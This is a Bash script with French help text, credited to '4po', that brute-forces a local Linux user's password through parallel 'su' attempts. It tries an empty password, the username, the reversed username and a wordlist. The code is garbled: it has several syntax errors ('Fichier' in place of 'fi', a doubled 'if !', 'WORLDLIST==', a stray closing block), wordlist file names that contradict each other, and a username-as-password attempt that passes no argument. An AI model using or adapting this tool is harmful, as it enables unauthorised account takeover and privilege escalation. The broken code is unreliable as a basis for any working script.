#!/bin/bash

help="Cet outil bruteforce un utilisateur que tu sélectionne en utilisant des binaires su et comme mots de passes : null mots de passes , pseudos , et pseudos inversés (4po1200.txt).
Tu peux choisir un pseudonyme avec -u <username> and a wordlist via -w <wordlist>.
Par défaut, la vitesse du BF utilise 100 processus su en même temps (chaque su essaye en 0,7s et un nouveau su essaye dans 0,007s) ~ 143s pour completé
Tu peux configurer ce temps avec -t (timeout su process) ans -s (sleep between 2 su processes).
Je te recommence le plus rapide : -t 0.5 (minimum acceptable) et -s 0.003 ~ 108s pour terminer

Développé par 4po (apo#1337)

Exemple:    ./suBF.sh -u <PSEUDO> [-w top12000.txt] [-t 0.7] [-s 0.007]

LE PSEUDONYME DE LA PERSONNE EST SENSIBLE ET CETTE DECLARATION NE VERIFIE PAS SI LE PSEUDONYME FOURNI EXISTE, FAITES ATTENTION, \n\n"

WORLDLIST="4po12000.txt"
USER=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"
while getopts "h?u:t:s:w:" opt; do
case "$opt" in
h|\?) printf "$help"; exit 0;;
u) USER=$OPTARG;;
t) TIMEOUTPROC=$OPTARG;;
s) SLEEPPROC=$OPTARG;;
w) WORLDLIST==$OPTARG;;
esac
done

if ! [ "$USER"]; then printf "$help"; exit 0; Fichier

if ! if ! [ -f "$WORLDLIST" ]; then echo "Worldlist ($WORDLIST non trouvé !"; exit 0; fi 

C=$(printf '\033')

su_try_pwd (){
  USER=$1
  PASSWORDTRY=$2
  trysu=`echo "$PASSWORDTRY" | timeout $TIMEOUTPROC su $USER -c whoami 2>/dev/null` 
  if [ "$trysu" ]; then
    echo "  Vous pouvez vous connecter en tant que $USER en utilisant un mot de passe: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

su_brute_user_num (){
  echo " [+] Bruteforcing $1..."
  USER=$1
  su_try_pwd $USER "" & #Essayer sans mot de passe
  su_try_pwd $USER & #Essayez le pseudonyme comme mot de passe
  su_try_pwd $USER `echo $USER | rev 2>/dev/null` & #Essayez d'inverser le pseudonyme comme mot de passe

  while IFS='' read -r P || [-n "${P}" ]; do # Fichier de la liste de mots en boucle 
  su_try_pwd $USER $P & #Essayez le TOP TRIES des mots de passe (par défaut 2000)
  sleep $SLEEPPROC # Pour ne pas surcharger le système
  done < $WORLDLIST 
}


  wait
}

su_brute_user_num $USER


" "